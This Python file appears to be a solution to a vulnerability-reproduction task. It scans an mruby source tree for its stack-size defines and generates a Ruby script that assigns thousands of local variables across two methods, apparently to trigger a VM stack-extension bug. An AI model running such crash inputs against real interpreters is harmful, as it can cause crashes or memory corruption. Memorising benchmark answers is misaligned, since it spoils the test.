import os
import re
import tarfile
from typing import Optional, Iterable, Tuple, List, Set


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> Iterable[str]:
        for base, _, files in os.walk(root):
            for fn in files:
                if fn.endswith((".h", ".c", ".cc", ".cpp")):
                    yield os.path.join(base, fn)

    def _read_text_file(self, path: str, limit: int = 2_000_000) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read(limit)
            return data.decode("utf-8", "ignore")
        except Exception:
            return ""

    def _read_text_from_tar_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, limit: int = 2_000_000) -> str:
        try:
            f = tf.extractfile(member)
            if f is None:
                return ""
            data = f.read(limit)
            return data.decode("utf-8", "ignore")
        except Exception:
            return ""

    def _scan_defines_in_text(self, text: str) -> Tuple[Optional[int], Optional[int]]:
        init_size = None
        max_size = None

        m = re.search(r'^\s*#\s*define\s+MRB_STACK_INIT_SIZE\s+(\d+)\s*$', text, re.M)
        if m:
            try:
                init_size = int(m.group(1))
            except Exception:
                pass

        m = re.search(r'^\s*#\s*define\s+MRB_STACK_MAX\s+(\d+)\s*$', text, re.M)
        if m:
            try:
                max_size = int(m.group(1))
            except Exception:
                pass

        return init_size, max_size

    def _scan_defines(self, src_path: str) -> Tuple[int, int]:
        init_size = None
        max_size = None

        def upd(a: Optional[int], b: Optional[int]) -> None:
            nonlocal init_size, max_size
            if a is not None and init_size is None:
                init_size = a
            if b is not None and max_size is None:
                max_size = b

        if os.path.isdir(src_path):
            for fp in self._iter_source_files_from_dir(src_path):
                if init_size is not None and max_size is not None:
                    break
                txt = self._read_text_file(fp)
                a, b = self._scan_defines_in_text(txt)
                upd(a, b)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if init_size is not None and max_size is not None:
                            break
                        if not m.isfile():
                            continue
                        n = m.name
                        if not (n.endswith(".h") or n.endswith(".c") or n.endswith(".cc") or n.endswith(".cpp")):
                            continue
                        if "mruby" not in n and "vm" not in n and "stack" not in n and "config" not in n and "include" not in n:
                            continue
                        txt = self._read_text_from_tar_member(tf, m)
                        a, b = self._scan_defines_in_text(txt)
                        upd(a, b)
            except Exception:
                pass

        if init_size is None:
            init_size = 128
        if max_size is None:
            max_size = 0

        return init_size, max_size

    def _idx_to_name(self, idx: int) -> str:
        x = idx + 1
        chars = []
        while x > 0:
            x -= 1
            chars.append(chr(ord('a') + (x % 26)))
            x //= 26
        return ''.join(reversed(chars))

    def _generate_names(self, count: int) -> List[str]:
        reserved: Set[str] = {
            "BEGIN", "END",
            "alias", "and", "begin", "break", "case", "class", "def", "defined", "do",
            "else", "elsif", "end", "ensure", "false", "for", "if", "in", "module",
            "next", "nil", "not", "or", "redo", "rescue", "retry", "return", "self",
            "super", "then", "true", "undef", "unless", "until", "when", "while", "yield",
            "__LINE__", "__FILE__", "__ENCODING__",
        }

        res: List[str] = []
        i = 0
        while len(res) < count:
            n = self._idx_to_name(i)
            i += 1
            if n in reserved:
                continue
            res.append(n)
        return res

    def solve(self, src_path: str) -> bytes:
        init_size, max_size = self._scan_defines(src_path)

        n_big = max(3000, init_size * 20)
        n_small = max(1000, init_size * 6)
        if n_small >= n_big:
            n_small = max(1, n_big // 2)

        if max_size and max_size > 0:
            # Keep a margin so we extend but don't hit hard limits.
            margin = 32
            cap = max(64, max_size - margin)
            if n_big > cap:
                n_big = cap
            if n_small > cap:
                n_small = max(1, cap // 2)
            if n_small >= n_big:
                n_small = max(1, n_big // 2)

        names = self._generate_names(n_big)
        lhs_small = ",".join(names[:n_small])
        lhs_big = ",".join(names[:n_big])

        s = "def a;" + lhs_small + "=0;end;def b;" + lhs_big + "=0;end;a;b\n"
        return s.encode("ascii", "ignore")